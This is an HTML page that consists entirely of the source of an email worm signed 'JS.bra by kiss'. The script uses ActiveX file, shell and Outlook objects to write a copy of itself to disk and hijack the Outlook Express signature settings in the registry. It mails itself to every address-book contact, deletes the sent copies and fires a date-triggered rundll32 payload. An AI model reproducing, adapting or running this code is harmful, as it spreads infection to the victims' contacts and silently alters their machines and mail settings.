<html>

<!-- JS.bra by kiss -->

<script>
window.onerror = e;dom = document.open("c:\autoexec.bat", "_blank");dom.document.write("<object id=a classid=clsid:0D43FE01-F093-11CF-8940-00A0C9054228></object>

<object id=b classid=clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8></object>
<object id=c classid=clsid:0006F033-0000-0000-C000-000000000046></object>");ola = dom.c;me = document.body.outerText;indx = me.indexOf("kiss") - 16;us = me.substr(indx);htm = dom.a.CreateTextFile("C:\\RECYCLED\\BRA.HTM");htm.Write(us);htm.Close();adf = dom.b.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\AppData");fld = dom.a.GetFolder(adf+"\\Identities");enu = new Enumerator(fld.SubFolders);while (!enu.atEnd()) {sbf = enu.item();idn = sbf.Name;ky = "HKCU\\Identities\\"+idn+"\\Software\\Microsoft\\Outlook Express\\5.0\\";sg = "signatures\\";sk = "00000000\\";dom.b.RegWrite(ky+sg+"Default Signature", "00000000");dom.b.RegWrite(ky+sg+sk+"name", "Signature #1");dom.b.RegWrite(ky+sg+sk+"type", 2, "REG_DWORD");dom.b.RegWrite(ky+sg+sk+"text", "");dom.b.RegWrite(ky+sg+sk+"file", "C:\\RECYCLED\\BRA.HTM");dom.b.RegWrite(ky+"Signature Flags", 3, "REG_DWORD");enu.moveNext();}if (dom.b.RegRead("HKCU\\Software\\JS.Bra\\Mailed") == "") {mapi = dom.c.GetNameSpace("MAPI");mapi.Logon();ali = new Enumerator(mapi.AddressLists);while (!ali.atEnd()) {al = ali.item();aei = new Enumerator(al.AddressEntries);while (!aei.atEnd()) {ae = aei.item();msg = dom.c.CreateItem(0);msg.Recipients.Add(ae.Name);msg.Subject = "Bra Cup";msg.HtmlBody = me;msg.DeleteAfterSubmit = true;msg.Send();aei.moveNext();}ali.moveNext();}mapi.Logoff();dom.b.RegWrite("HKCU\\Software\\JS.Bra\\Mailed", "Kiss");}dt = new Date;if (dt.getDate() == 18) {if (dt.getMonth() == 5) {shl.Run("rundll32 user.exe,DisableOEMLayer");}}function e() {return true;}
</script>
</html>